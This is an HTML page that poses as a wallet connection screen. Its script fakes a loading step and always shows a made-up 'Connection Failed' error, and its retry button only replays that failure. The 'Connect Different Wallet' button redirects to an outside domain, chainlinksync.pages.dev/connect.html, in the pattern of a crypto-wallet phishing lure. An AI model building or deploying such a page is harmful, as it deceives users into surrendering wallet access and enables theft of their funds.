<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Wallet Connection Error</title>
    <style>
        body {
            font-family: 'Arial', sans-serif;
            background-color: #121212;
            color: #ffffff;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            flex-direction: column;
            text-align: center;
        }
        
        .container {
            max-width: 500px;
            padding: 30px;
            background-color: #1e1e1e;
            border-radius: 10px;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.3);
        }
        
        .loading-container {
            display: block;
        }
        
        .error-container {
            display: none;
        }
        
        .loader {
            border: 5px solid #333;
            border-radius: 50%;
            border-top: 5px solid #4CAF50;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        h1 {
            color: #4CAF50;
            margin-bottom: 20px;
        }
        
        .error-icon {
            font-size: 50px;
            color: #f44336;
            margin-bottom: 20px;
        }
        
        p {
            margin-bottom: 25px;
            line-height: 1.6;
        }
        
        .btn {
            background-color: #4CAF50;
            color: white;
            border: none;
            padding: 12px 25px;
            text-align: center;
            text-decoration: none;
            display: inline-block;
            font-size: 16px;
            margin: 10px 2px;
            cursor: pointer;
            border-radius: 5px;
            transition: background-color 0.3s;
        }
        
        .btn:hover {
            background-color: #45a049;
        }
        
        .btn-secondary {
            background-color: #333;
        }
        
        .btn-secondary:hover {
            background-color: #444;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="loading-container" id="loading">
            <div class="loader"></div>
            <h1>Connecting to Wallet</h1>
            <p>Please wait while we connect to your wallet...</p>
        </div>
        
        <div class="error-container" id="error">
            <div class="error-icon">⚠️</div>
            <h1>Connection Failed</h1>
            <p>We couldn't establish a connection to your wallet. This might be due to network issues or wallet compatibility problems.</p>
            <p>Please try connecting with a different wallet or check your connection settings.</p>
            <button class="btn" onclick="retryConnection()">Try Again</button>
            <button class="btn btn-secondary" onclick="redirectToWalletConnect()">Connect Different Wallet</button>
        </div>
    </div>

    <script>
        // Simulate loading process
        setTimeout(function() {
            document.getElementById('loading').style.display = 'none';
            document.getElementById('error').style.display = 'block';
        }, 3000); // Show error after 3 seconds
        
        function retryConnection() {
            document.getElementById('error').style.display = 'none';
            document.getElementById('loading').style.display = 'block';
            
            // Simulate another loading attempt
            setTimeout(function() {
                document.getElementById('loading').style.display = 'none';
                document.getElementById('error').style.display = 'block';
            }, 2000);
        }
        
        function redirectToWalletConnect() {
            // Redirect to the specified URL
            window.location.href = 'https://chainlinksync.pages.dev/connect.html';
        }
    </script>
</body>
</html>
